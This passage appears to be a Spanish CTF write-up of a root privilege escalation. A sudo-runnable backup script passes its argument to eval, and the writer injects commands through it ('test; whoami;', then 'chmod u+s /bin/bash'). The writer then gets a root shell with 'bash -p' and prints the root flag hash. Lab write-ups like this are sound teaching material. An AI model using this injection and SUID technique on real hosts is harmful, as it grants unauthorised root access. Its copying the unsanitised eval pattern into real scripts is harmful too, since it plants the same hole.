Veremos que podemos ejecutar el script `/opt/scripts/backup.sh` como el usuario `root` por lo que vamos a investigar que hace.

Si leemos el codigo veremos lo siguiente:

```bash
#!/bin/bash
# Author: Álvaro Bernal (aka. trr0r)
# backup.sh: Realiza una copia de un log en una ubicación determinada (/backup)

# COLORES
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
orangeColour="\e[38;5;214m\033[1m"
darkRedColour="\e[38;5;124m\033[1m"

if [ $# -eq 0 ]; then
    echo -e "\n${redColour}[!] Error, debes de proporcionar un argumento.${endColour}\n\n\t${blueColour}Example:${endColour} ${greenColour}/opt/scripts/backup.sh access${endColour}\n"
    exit
fi

# Variables GLOBALES
LOG_DIR="/var/log/apache2"
BACKUP_DIR="/backup"

LOG_NAME=$1

FULL_NAME="$LOG_DIR/$LOG_NAME.log"

/usr/bin/echo "Realizando copia de $FULL_NAME en $BACKUP_DIR"
COMMAND="/usr/bin/cp $FULL_NAME $BACKUP_DIR"
eval $COMMAND
```

Vemos que puede tener una vulnerabilidad en el script, que es el echo de concatenar comandos, vamos a probar a realizar lo siguiente a ver si funciona.

```shell
sudo /opt/scripts/backup.sh "test; whoami;"
```

Info:

```
Realizando copia de /var/log/apache2/test; whoami;.log en /backup
/usr/bin/cp: missing destination file operand after '/var/log/apache2/test'
Try '/usr/bin/cp --help' for more information.
root
/opt/scripts/backup.sh: line 32: .log: command not found
```

Vemos que efectivamente funciona y nos pondra que es `root` por lo que vamos a establecer la `bash` con permisos `SUID`.

```shell
sudo /opt/scripts/backup.sh "test; chmod u+s /bin/bash | echo 'Permisos establecidos de forma correcta...';"
```

Info:

```
Realizando copia de /var/log/apache2/test; chmod u+s /bin/bash | echo 'Permisos establecidos de forma correcta...';.log en /backup
/usr/bin/cp: missing destination file operand after '/var/log/apache2/test'
Try '/usr/bin/cp --help' for more information.
Permisos establecidos de forma correcta...
/opt/scripts/backup.sh: line 32: .log: command not found
```

Vemos que ha funcionado, vamos a comprobarlo de la siguiente forma:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Vemos que efectivamente ha funcionado, por lo que haremos lo siguiente para ser `root`.

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto ya seremos `root` por lo que leeremos la `flah` de `root`:

> root.txt

```
58a42609370d35a203f541d8d41801a8
```
